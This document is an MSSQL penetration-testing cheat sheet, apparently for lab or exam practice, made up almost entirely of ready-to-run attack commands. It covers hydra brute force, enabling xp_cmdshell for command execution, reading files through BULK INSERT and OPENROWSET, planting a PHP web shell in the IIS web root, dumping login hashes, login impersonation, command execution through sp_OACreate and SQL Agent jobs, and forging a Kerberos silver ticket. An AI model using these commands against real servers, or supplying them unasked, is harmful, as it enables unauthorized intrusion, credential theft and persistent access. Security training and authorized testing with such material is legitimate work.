# MSSQL Enumeration (1433)

## Run nmap MSSQL scripts
```bash
nmap --script=ms-sql-* -p 1433 $IP
```

## Check SQL Browser on UDP 1434
```bash
nmap -sU -p 1434 $IP
```

## Connect with impacket-mssqlclient
```bash
impacket-mssqlclient sa:password@$IP
impacket-mssqlclient domain.local/user:password@$IP -windows-auth
```

## Brute force MSSQL with hydra
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt $IP mssql
```

## Check current user and sysadmin
```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## List databases
```sql
SELECT name FROM sys.databases;
```

## List tables in current database
```sql
SELECT name FROM sys.tables;
```

## Check whether xp_cmdshell is enabled
```sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

## Enable xp_cmdshell
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

## Execute commands with xp_cmdshell
```sql
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
```

## Read a file with BULK INSERT
```sql
CREATE TABLE temp (line varchar(8000));
BULK INSERT temp FROM 'c:\windows\system32\drivers\etc\hosts';
SELECT * FROM temp;
DROP TABLE temp;
```

## Read a file with OPENROWSET
```sql
SELECT * FROM OPENROWSET(BULK 'c:\windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
```

## Write a web shell with xp_cmdshell
```sql
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > c:\inetpub\wwwroot\shell.php';
```

## Dump SQL login hashes
```sql
SELECT name, password_hash FROM sys.sql_logins;
```

## Enumerate linked servers
```sql
EXEC sp_linkedservers;
SELECT name FROM master.dbo.sysservers WHERE isremote = 1;
```

## Execute query on linked server
```sql
SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT @@version');
```

## Impersonate another login if allowed
```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## Run sp_OACreate command execution
```sql
DECLARE @myshell INT;
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "whoami > c:\temp\output.txt"';
```

## Run a SQL Agent job
```sql
USE msdb;
EXEC dbo.sp_add_job @job_name = 'test_job';
EXEC sp_add_jobstep @job_name = 'test_job', @step_name = 'test_step', @subsystem = 'cmdexec', @command = 'whoami > c:\temp\output.txt';
EXEC dbo.sp_add_jobserver @job_name = 'test_job';
EXEC dbo.sp_start_job N'test_job';
```

## Back up a database
```sql
BACKUP DATABASE database_name TO DISK = 'c:\temp\database_backup.bak';
```

## Forge a silver ticket for MSSQL
```bash
impacket-ticketer -nthash <service_nt_hash> -domain-sid <domain_sid> -domain domain.local -spn MSSQL/sql.domain.local -user-id 500 Administrator
export KRB5CCNAME=$PWD/Administrator.ccache
impacket-mssqlclient -k sql.domain.local
```

## Read a file over MSSQL with a silver ticket
```sql
SELECT * FROM OPENROWSET(BULK 'c:\users\administrator\desktop\proof.txt', SINGLE_CLOB) AS contents;
```
